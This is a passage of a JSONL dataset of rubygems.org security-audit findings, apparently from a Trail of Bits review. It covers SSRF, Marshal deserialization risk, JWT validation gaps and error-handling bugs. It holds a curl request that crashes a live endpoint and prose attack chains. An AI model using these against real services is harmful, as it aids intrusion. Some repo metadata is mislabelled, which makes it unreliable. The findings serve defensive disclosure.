Severity: Medium                                                                             | Diffi culty: Low      |\n|-------------------------------------------------------------------------------------------------|-----------------------------|\n| Type: Data Validation                                                                     | Finding ID: TOB-RGM-8 |\n| Target: rubygems.org/app/models/web_hook.rb, rubygems.org/app/jobs/notify_web_hook_job.rb |                             |\n\n#### Description\n\nWeb hook test \"fire\" functionality allows specifying sensitive hostnames like localhost and IPs like 10.0.0.1. This allows an attacker to perform SSRF attacks against internal hosts. This functionality exists as an Active Job in the following locations:\n\n```\ndef fire(protocol, host_with_port, version, delayed: true)\n  job = NotifyWebHookJob.new(webhook: self, protocol:, host_with_port:, version:)\n  if delayed\n    job.enqueue\n  else\n    job.perform_now\n  end\nend\n```\n\n*Figure 8.1: Active Record model for firing web hooks ([rubygems.org/app/models/web\\\\_hook.rb#23–31](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/models/web_hook.rb#L23-L31))*\n\nThis functionality ultimately makes an HTTP POST request to an attacker-specified URL in the following location:\n\n```\ndef payload\n  rubygem.payload(version, protocol, host_with_port).to_json\nend\n...\ndef post(url)\n  Faraday.new(nil, request: { timeout: TIMEOUT_SEC }) do |f|\n    f.request :json\n    f.response :logger, logger, headers: false, errors: true\n    f.response :raise_error\n  end.post(\n    url, payload,\n    {\n      \"Authorization\" => authorization,\n      \"HR_TARGET_URL\" => webhook.url,\n      \"HR_MAX_ATTEMPTS\" => \"3\"\n    }\n```\n\n\n) end\n\n> *Figure 8.2: HTTP POST request to URL ([rubygems.org/app/jobs/notify\\\\_web\\\\_hook\\\\_job.rb#77–90](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/jobs/notify_web_hook_job.rb#L77-L90))*\n\nTests to most internal URLs seemingly fail, which is not observable to the outside user. However, firing a web hook to http://localhost:3000/api/v1/gems appears to succeed, which indicates that SSRF attacks to internal hosts are possible.\n\n#### Exploit Scenario\n\nAn attacker discovers an SSRF vulnerability in the web hook functionality. If they can combine this with a CRLF [injection](https://owasp.org/www-community/vulnerabilities/CRLF_Injection) in the underlying HTTP library, and a deserialization vulnerability like [TOB-RGM-3,](#page-24-0) then they may be able to inject arbitrary data into the cache store and later achieve remote code execution. This attack chain is well-documented in A New Era of SSRF, included in the References section below.\n\nSimilarly, an attacker may be able to make POST requests to arbitrary hosts on the internal network. This is often not an exploit in and of itself, but SSRF vulnerabilities can commonly be combined with other issues to achieve higher impact.\n\n#### Recommendations\n\nShort term, proxy web hook HTTP requests through an application like [Smokescreen](https://github.com/stripe/smokescreen). This will prevent requests from reaching internal address space.\n\nLong term, write automated tests to ensure that all web hook requests are proxied and cannot reach internal address space.\n\n#### References\n\n- A New Era of SSRF Exploiting URL Parser in Trending [Programming](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) Languages!\n- OWASP [Server-Side Request](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html) Forgery Prevention Cheat Sheet\n", "severity": "Medium", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-RGM-8", "target": {"path": "rubygems.org/app/models/web_hook.rb, rubygems.org/app/jobs/notify_web_hook_job.rb", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/stripe/smokescreen", "org": "stripe", "name": "smokescreen", "commit": null, "branch": null, "relative_file": "rubygems.org/app/models/web_hook.rb, rubygems.org/app/jobs/notify_web_hook_job.rb", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-RGM-8", "Target": "rubygems.org/app/models/web_hook.rb, rubygems.org/app/jobs/notify_web_hook_job.rb"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-009", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 9, "page_start": 34, "title": "Service stores spec Marshal data alongside gem file", "short_summary": null, "description_md": "#### Description\n\nIn Ruby, Marshal data presents a security risk because it can result in deserialization bugs, which can lead to remote code execution. The Marshal module includes the [following](https://ruby-doc.org/3.3.4/Marshal.html#module-Marshal-label-Security+considerations) [warning](https://ruby-doc.org/3.3.4/Marshal.html#module-Marshal-label-Security+considerations):\n\nBy design, Marshal.load can deserialize almost any class loaded into the Ruby process. In many cases this can lead to remote code execution if the Marshal data is loaded from an untrusted source.\n\nAs a result, Marshal.load is not suitable as a general purpose serialization format and you should never unmarshal user supplied input or other untrusted data.\n\nIf you need to deserialize untrusted data, use JSON or another serialization format that is only able to load simple, 'primitive' types such as String, Array, Hash, etc. Never allow user input to specify arbitrary types to deserialize into.\n\nWhen users upload new gems to the RubyGems service, the application stores the gem itself and a Marshaled representation of the spec data in S3:\n\n```\ndef write_gem(body, spec_contents)\n  gem_path = \"gems/#{@version.gem_file_name}\"\n  gem_contents = body.string\n  ...\n  spec_path = \"quick/Marshal.4.8/#{@version.full_name}.gemspec.rz\"\n  ...\n  RubygemFs.instance.store(gem_path, gem_contents, checksum_sha256: version.sha256)\n  RubygemFs.instance.store(spec_path, spec_contents, checksum_sha256: version.spec_sha256)\n  Fastly.purge(path: gem_path)\n  Fastly.purge(path: spec_path)\nend\n```\n\n*Figure 9.1: Marshaled spec data ([rubygems.org/app/models/pusher.rb#246–258](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/models/pusher.rb#L246-L258))*\n\n\nThe RubyGems application never uses this Marshaled spec data in an automated way. However, it is used when executing one-off Rake tasks such as gemcutter:metadata:backfill or gemcutter:required\\_ruby\\_version:backfill:\n\n```\ndef get_spec_attribute(version_full_name, attribute_name)\n  key = \"quick/Marshal.4.8/#{version_full_name}.gemspec.rz\"\n  file = RubygemFs.instance.get(key)\n  return nil unless file\n  spec = Marshal.load(Gem::Util.inflate(file))\n  spec.send(attribute_name)\nrescue StandardError => e\n  Rails.logger.info(\"[gemcutter:required_ruby_version:backfill] could not get\nrequired_ruby_version for version: #{version_full_name} \" \\\n                    \"error: #{e.inspect}\")\n  nil\nend\n```\n\n*Figure 9.2: Marshal load of spec data ([rubygems.org/lib/tasks/helpers/gemcutter\\\\_tasks\\\\_helper.rb#31–41](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/lib/tasks/helpers/gemcutter_tasks_helper.rb#L31-L41))*\n\nThe Marshaled spec data is also used in the [rubygems](https://github.com/rubygems/rubygems) repository (i.e., the gem and bundler commands). Although this project is out of scope, and uses a [SafeMarshal](https://github.com/rubygems/rubygems/blob/v3.5.18/bundler/lib/bundler/safe_marshal.rb) implementation, it is still interesting to consider. The Marshaled spec data is used in the [Gem::Source](https://github.com/rubygems/rubygems/blob/v3.5.18/lib/rubygems/source.rb#L146) and [Bundler::Fetcher](https://github.com/rubygems/rubygems/blob/v3.5.18/bundler/lib/bundler/fetcher.rb#L114) functionality. The former is commonly employed to exploit Ruby Marshal [deserialization](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/) bugs. If an attacker can find a bypass in the SafeMarshal implementation, or otherwise convince a program to load that data, then they could achieve code execution. Additionally, if a client that is not using the SafeMarshal implementation—like the RubyGems Rake tasks—accesses that data, then it is not protected.\n\nWhile this Marshal functionality does not currently appear to be exploitable, removing it and its associated functionality would reduce risk within the Ruby community as a whole; this would remove both the ability to accidentally unmarshal potentially malicious data and a common exploitation pattern for Ruby code.\n", "full_markdown": "# 9. Service stores spec Marshal data alongside gem file\n\n| Severity: Informational                                                                                                                          | Diffi culty: High     |\n|-----------------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------|\n| Type: Data Validation                                                                                                                         | Finding ID: TOB-RGM-9 |\n| Target: rubygems.org/app/models/pusher.rb, rubygems.org/lib/tasks/helpers/gemcutter_tasks_helper.rb, rubygems.org/lib/tasks/gemcutter.rake |                             |\n\n#### Description\n\nIn Ruby, Marshal data presents a security risk because it can result in deserialization bugs, which can lead to remote code execution. The Marshal module includes the [following](https://ruby-doc.org/3.3.4/Marshal.html#module-Marshal-label-Security+considerations) [warning](https://ruby-doc.org/3.3.4/Marshal.html#module-Marshal-label-Security+considerations):\n\nBy design, Marshal.load can deserialize almost any class loaded into the Ruby process. In many cases this can lead to remote code execution if the Marshal data is loaded from an untrusted source.\n\nAs a result, Marshal.load is not suitable as a general purpose serialization format and you should never unmarshal user supplied input or other untrusted data.\n\nIf you need to deserialize untrusted data, use JSON or another serialization format that is only able to load simple, 'primitive' types such as String, Array, Hash, etc. Never allow user input to specify arbitrary types to deserialize into.\n\nWhen users upload new gems to the RubyGems service, the application stores the gem itself and a Marshaled representation of the spec data in S3:\n\n```\ndef write_gem(body, spec_contents)\n  gem_path = \"gems/#{@version.gem_file_name}\"\n  gem_contents = body.string\n  ...\n  spec_path = \"quick/Marshal.4.8/#{@version.full_name}.gemspec.rz\"\n  ...\n  RubygemFs.instance.store(gem_path, gem_contents, checksum_sha256: version.sha256)\n  RubygemFs.instance.store(spec_path, spec_contents, checksum_sha256: version.spec_sha256)\n  Fastly.purge(path: gem_path)\n  Fastly.purge(path: spec_path)\nend\n```\n\n*Figure 9.1: Marshaled spec data ([rubygems.org/app/models/pusher.rb#246–258](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/models/pusher.rb#L246-L258))*\n\n\nThe RubyGems application never uses this Marshaled spec data in an automated way. However, it is used when executing one-off Rake tasks such as gemcutter:metadata:backfill or gemcutter:required\\_ruby\\_version:backfill:\n\n```\ndef get_spec_attribute(version_full_name, attribute_name)\n  key = \"quick/Marshal.4.8/#{version_full_name}.gemspec.rz\"\n  file = RubygemFs.instance.get(key)\n  return nil unless file\n  spec = Marshal.load(Gem::Util.inflate(file))\n  spec.send(attribute_name)\nrescue StandardError => e\n  Rails.logger.info(\"[gemcutter:required_ruby_version:backfill] could not get\nrequired_ruby_version for version: #{version_full_name} \" \\\n                    \"error: #{e.inspect}\")\n  nil\nend\n```\n\n*Figure 9.2: Marshal load of spec data ([rubygems.org/lib/tasks/helpers/gemcutter\\\\_tasks\\\\_helper.rb#31–41](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/lib/tasks/helpers/gemcutter_tasks_helper.rb#L31-L41))*\n\nThe Marshaled spec data is also used in the [rubygems](https://github.com/rubygems/rubygems) repository (i.e., the gem and bundler commands). Although this project is out of scope, and uses a [SafeMarshal](https://github.com/rubygems/rubygems/blob/v3.5.18/bundler/lib/bundler/safe_marshal.rb) implementation, it is still interesting to consider. The Marshaled spec data is used in the [Gem::Source](https://github.com/rubygems/rubygems/blob/v3.5.18/lib/rubygems/source.rb#L146) and [Bundler::Fetcher](https://github.com/rubygems/rubygems/blob/v3.5.18/bundler/lib/bundler/fetcher.rb#L114) functionality. The former is commonly employed to exploit Ruby Marshal [deserialization](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/) bugs. If an attacker can find a bypass in the SafeMarshal implementation, or otherwise convince a program to load that data, then they could achieve code execution. Additionally, if a client that is not using the SafeMarshal implementation—like the RubyGems Rake tasks—accesses that data, then it is not protected.\n\nWhile this Marshal functionality does not currently appear to be exploitable, removing it and its associated functionality would reduce risk within the Ruby community as a whole; this would remove both the ability to accidentally unmarshal potentially malicious data and a common exploitation pattern for Ruby code.\n\n#### Exploit Scenario\n\nAn attacker gains access to the S3 bucket storing Marshaled spec data. This could occur via access control misconfiguration, SSRF, data validation issues during the gem upload process, or some other attack vector. The attacker then uploads or modifies Marshaled data such that when it is loaded, it exploits a deserialization bug.\n\n#### Recommendations\n\nShort term, ensure that any clients accessing these Marshaled .rz files under the rubygems GitHub organization are using the SafeMarshal implementation.\n\nLong term, consider removing functionality associated with these .rz files, or moving to a safer serialization format such as JSON. Alternatively, if the RubyGems service needs to\n\n\n\nprovide this information externally, then consider storing this metadata in the production database instead of serialized data files in S3.\n", "severity": "Informational", "difficulty": "High", "type": "Data Validation", "finding_id": "TOB-RGM-9", "target": {"path": "rubygems.org/app/models/pusher.rb, rubygems.org/lib/tasks/helpers/gemcutter_tasks_helper.rb, rubygems.org/lib/tasks/gemcutter.rake", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/stripe/smokescreen", "org": "stripe", "name": "smokescreen", "commit": null, "branch": null, "relative_file": "rubygems.org/app/models/pusher.rb, rubygems.org/lib/tasks/helpers/gemcutter_tasks_helper.rb, rubygems.org/lib/tasks/gemcutter.rake", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Type": "Data Validation", "Finding ID": "TOB-RGM-9", "Target": "rubygems.org/app/models/pusher.rb, rubygems.org/lib/tasks/helpers/gemcutter_tasks_helper.rb, rubygems.org/lib/tasks/gemcutter.rake"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-010", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 10, "page_start": 37, "title": "Unhandled exception in trusted publisher exchange token request", "short_summary": null, "description_md": "#### Description\n\nCalling the exchange\\_token action from the\n\nApi::V1::OIDC::TrustedPublisherController controller without any parameters results in a 500 error due to an unhandled exception (figure 10.1). This occurs because the ActionController::ParameterMissing error handler code from ApplicationController (figure 11.2) calls a wrong render\\_bad\\_request function. The handler code is executed in the context of the deriving controller, which overrides the render\\_bad\\_request function (figure 10.3). The overridden function has no arguments, but the error handler calls render\\_bad\\_request with an argument, which causes an ArgumentError to be thrown and an internal server error.\n\n```\ncurl -XPOST https://rubygems.org/api/v1/oidc/trusted_publisher/exchange_token.json\n{\"status\":500,\"error\":\"Internal Server Error\"}\n```\n\n*Figure 10.1: A controller crash triggered by a request without parameters*\n\n```\nrescue_from(ActionController::ParameterMissing) do |e|\n  render_bad_request \"Request is missing param '#{e.param}'\"\nend\n```\n\n*Figure 10.2: Error handler calls render\\_bad\\_request with an argument ([rubygems.org/app/controllers/application\\\\_controller.rb#L54–L56](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/application_controller.rb#L54-L56))*\n\n```\ndef render_bad_request\n  render json: { error: \"Bad Request\" }, status: :bad_request\nend\n```\n\n*Figure 10.3: Overridden render\\_bad\\_request expects no arguments ([rubygems.org/app/controllers/api/v1/oidc/trusted\\\\_publisher\\\\_controller.rb](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/api/v1/oidc/trusted_publisher_controller.rb#L69-L71) [#L69–L71](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/api/v1/oidc/trusted_publisher_controller.rb#L69-L71))*\n", "full_markdown": "## 10. Unhandled exception in trusted publisher exchange token request\n\n| Severity: Informational                                             | Diffi culty: Low       |\n|------------------------------------------------------------------------|------------------------------|\n| Type: Error Reporting                                            | Finding ID: TOB-RGM-10 |\n| app/controllers/api/v1/oidc/trusted_publisher_controller.rb Target: |                              |\n\n#### Description\n\nCalling the exchange\\_token action from the\n\nApi::V1::OIDC::TrustedPublisherController controller without any parameters results in a 500 error due to an unhandled exception (figure 10.1). This occurs because the ActionController::ParameterMissing error handler code from ApplicationController (figure 11.2) calls a wrong render\\_bad\\_request function. The handler code is executed in the context of the deriving controller, which overrides the render\\_bad\\_request function (figure 10.3). The overridden function has no arguments, but the error handler calls render\\_bad\\_request with an argument, which causes an ArgumentError to be thrown and an internal server error.\n\n```\ncurl -XPOST https://rubygems.org/api/v1/oidc/trusted_publisher/exchange_token.json\n{\"status\":500,\"error\":\"Internal Server Error\"}\n```\n\n*Figure 10.1: A controller crash triggered by a request without parameters*\n\n```\nrescue_from(ActionController::ParameterMissing) do |e|\n  render_bad_request \"Request is missing param '#{e.param}'\"\nend\n```\n\n*Figure 10.2: Error handler calls render\\_bad\\_request with an argument ([rubygems.org/app/controllers/application\\\\_controller.rb#L54–L56](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/application_controller.rb#L54-L56))*\n\n```\ndef render_bad_request\n  render json: { error: \"Bad Request\" }, status: :bad_request\nend\n```\n\n*Figure 10.3: Overridden render\\_bad\\_request expects no arguments ([rubygems.org/app/controllers/api/v1/oidc/trusted\\\\_publisher\\\\_controller.rb](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/api/v1/oidc/trusted_publisher_controller.rb#L69-L71) [#L69–L71](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/api/v1/oidc/trusted_publisher_controller.rb#L69-L71))*\n\n## Recommendations\n\nShort term, remove the render\\_bad\\_request override from the Api::V1::OIDC::TrustedPublisherController controller. There is already [an](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/api/base_controller.rb#L93-L96) equivalent [render\\\\_bad\\\\_request](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/api/base_controller.rb#L93-L96) in Api::BaseController that will be used by the exception handler.\n\n\n\nLong term, add test cases to cover all error paths in controllers.\n", "severity": "Informational", "difficulty": "Low", "type": "Error Reporting", "finding_id": "TOB-RGM-10", "target": {"path": "app/controllers/api/v1/oidc/trusted_publisher_controller.rb", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/stripe/smokescreen", "org": "stripe", "name": "smokescreen", "commit": null, "branch": null, "relative_file": "app/controllers/api/v1/oidc/trusted_publisher_controller.rb", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Low", "Type": "Error Reporting", "Finding ID": "TOB-RGM-10", "Target": "app/controllers/api/v1/oidc/trusted_publisher_controller.rb"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-011", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 11, "page_start": 39, "title": "Insufficient JWT validation in trusted publisher exchange token request", "short_summary": null, "description_md": "#### Description\n\nThe JWT claims received from trusted publishers are insufficiently validated and result in triggerable unhandled exceptions. For instance, a missing nbf claim results in a NoMethodError: undefined method `+' for nil exception and nbf containing a string instead of an integer ArgumentError: bad value for range exception.\n\n```\ndef verify_signature\n  raise UnsupportedIssuer, \"Provider is missing jwks\" if @provider.jwks.blank?\n  raise UnverifiedJWT, \"Invalid time\" unless\n(@jwt[\"nbf\"]..@jwt[\"exp\"]).cover?(Time.now.to_i)\n  @jwt.verify!(@provider.jwks)\nend\n```\n\n*Figure 11.1: JWT claims used without any validation ([rubygems.org/app/controllers/api/v1/oidc/trusted\\\\_publisher\\\\_controller.rb](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/api/v1/oidc/trusted_publisher_controller.rb#L52-L56) [#L52–L56](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/api/v1/oidc/trusted_publisher_controller.rb#L52-L56))*\n", "full_markdown": "# 11. Insufficient JWT validation in trusted publisher exchange token request\n\n| Severity: Informational                                             | Diffi culty: Low       |\n|------------------------------------------------------------------------|------------------------------|\n| Type: Data Validation                                            | Finding ID: TOB-RGM-11 |\n| app/controllers/api/v1/oidc/trusted_publisher_controller.rb Target: |                              |\n\n#### Description\n\nThe JWT claims received from trusted publishers are insufficiently validated and result in triggerable unhandled exceptions. For instance, a missing nbf claim results in a NoMethodError: undefined method `+' for nil exception and nbf containing a string instead of an integer ArgumentError: bad value for range exception.\n\n```\ndef verify_signature\n  raise UnsupportedIssuer, \"Provider is missing jwks\" if @provider.jwks.blank?\n  raise UnverifiedJWT, \"Invalid time\" unless\n(@jwt[\"nbf\"]..@jwt[\"exp\"]).cover?(Time.now.to_i)\n  @jwt.verify!(@provider.jwks)\nend\n```\n\n*Figure 11.1: JWT claims used without any validation ([rubygems.org/app/controllers/api/v1/oidc/trusted\\\\_publisher\\\\_controller.rb](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/api/v1/oidc/trusted_publisher_controller.rb#L52-L56) [#L52–L56](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/api/v1/oidc/trusted_publisher_controller.rb#L52-L56))*\n\n## Recommendations\n\nShort term, validate all the JWT claims in the controller and add tests exercising missing and incorrect claim values.\n\nLong term, always validate all untrusted data as soon as it arrives into the system.\n", "severity": "Informational", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-RGM-11", "target": {"path": "app/controllers/api/v1/oidc/trusted_publisher_controller.rb", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/rubygems/rubygems", "org": "rubygems", "name": "rubygems", "commit": null, "branch": null, "relative_file": "app/controllers/api/v1/oidc/trusted_publisher_controller.rb", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-RGM-11", "Target": "app/controllers/api/v1/oidc/trusted_publisher_controller.rb"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-012", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 12, "page_start": 40, "title": "SSRF risk while refreshing OIDC providers", "short_summary": null, "description_md": "#### Description\n\nThe RefreshOIDCProviderJob uses the provider-controlled provider.configuration.jwks\\_uri to perform a GET request (figure 12.1). As a result, an attacker can perform SSRF attacks against internal hosts. The attack vector is limited since it relies on a compromised trusted provider.\n\n```\ndef perform(provider:)\n  connection = Faraday.new(provider.issuer, request: { timeout: 2 }, headers: {\n\"Accept\" => \"application/json\" }) do |f|\n    f.request :json\n    f.response :logger, logger, headers: false, errors: true, bodies: true\n    f.response :raise_error\n    f.response :json, content_type: //\n  end\n  resp = connection.get(\"/.well-known/openid-configuration\")\n  provider.configuration = resp.body\n  provider.configuration.validate!\n  provider.jwks = connection.get(provider.configuration.jwks_uri).body\n  provider.save!\nend\n```\n\n*Figure 12.1: Calling a URL provided by a third party ([rubygems.org/app/jobs/refresh\\\\_oidc\\\\_provider\\\\_job.rb#L7–L21](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/jobs/refresh_oidc_provider_job.rb#L7-L21))*\n", "full_markdown": "# 12. SSRF risk while refreshing OIDC providers\n\n| Severity: Informational                       | Diffi culty: High      |\n|--------------------------------------------------|------------------------------|\n| Type: Data Validation                      | Finding ID: TOB-RGM-12 |\n| Target: app/jobs/refresh_oidc_provider_job.rb |                              |\n\n#### Description\n\nThe RefreshOIDCProviderJob uses the provider-controlled provider.configuration.jwks\\_uri to perform a GET request (figure 12.1). As a result, an attacker can perform SSRF attacks against internal hosts. The attack vector is limited since it relies on a compromised trusted provider.\n\n```\ndef perform(provider:)\n  connection = Faraday.new(provider.issuer, request: { timeout: 2 }, headers: {\n\"Accept\" => \"application/json\" }) do |f|\n    f.request :json\n    f.response :logger, logger, headers: false, errors: true, bodies: true\n    f.response :raise_error\n    f.response :json, content_type: //\n  end\n  resp = connection.get(\"/.well-known/openid-configuration\")\n  provider.configuration = resp.body\n  provider.configuration.validate!\n  provider.jwks = connection.get(provider.configuration.jwks_uri).body\n  provider.save!\nend\n```\n\n*Figure 12.1: Calling a URL provided by a third party ([rubygems.org/app/jobs/refresh\\\\_oidc\\\\_provider\\\\_job.rb#L7–L21](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/jobs/refresh_oidc_provider_job.rb#L7-L21))*\n\n#### Exploit Scenario\n\nAn attacker takes control of the provider's /.well-known/openid-configuration endpoint and sets jwks\\_uri to perform GET requests on the internal network. While this is typically not an exploit on its own, SSRF vulnerabilities can commonly be combined with other issues to achieve higher impact.\n\n#### Recommendations\n\nShort term, proxy web hook HTTP requests through an application like [Smokescreen](https://github.com/stripe/smokescreen). This will prevent requests from reaching internal address space.\n\n\nLong term, write automated tests to ensure that all web hook requests are proxied and cannot reach internal address space.\n", "severity": "Informational", "difficulty": "High", "type": "Data Validation", "finding_id": "TOB-RGM-12", "target": {"path": "app/jobs/refresh_oidc_provider_job.rb", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/rubygems/rubygems", "org": "rubygems", "name": "rubygems", "commit": null, "branch": null, "relative_file": "app/jobs/refresh_oidc_provider_job.rb", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Type": "Data Validation", "Finding ID": "TOB-RGM-12", "Target": "app/jobs/refresh_oidc_provider_job.rb"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-013", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 13, "page_start": 42, "title": "The jti claim uniqueness is not enforced by database", "short_summary": null, "description_md": "#### Description\n\nThe jti claim from OIDC ID token is validated for uniqueness (figure 13.1), but this constraint is not enforced by the database (figure 13.2), which makes the application vulnerable to race conditions.\n\n```\ndef jti_uniqueness\n  relation = self.class.where(\"(jwt->>'claims')::jsonb->>'jti' = ?\", jti)\n  relation = relation.provider_id(api_key_role.oidc_provider_id) if api_key_role\n  return unless relation.where.not(id: self).exists?\n  errors.add(\"jwt.claims.jti\", \"must be unique\")\nend\n```\n\n*Figure 13.1: The jti claim uniqueness validation in application code ([rubygems.org/app/jobs/refresh\\\\_oidc\\\\_provider\\\\_job.rb#L7–L21](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/jobs/refresh_oidc_provider_job.rb#L7-L21))*\n\n```\ncreate_table \"oidc_id_tokens\", force: :cascade do |t|\n  t.bigint \"oidc_api_key_role_id\", null: false\n  t.jsonb \"jwt\", null: false\n  t.bigint \"api_key_id\"\n  t.datetime \"created_at\", null: false\n  t.datetime \"updated_at\", null: false\n  t.index [\"api_key_id\"], name: \"index_oidc_id_tokens_on_api_key_id\"\n  t.index [\"oidc_api_key_role_id\"], 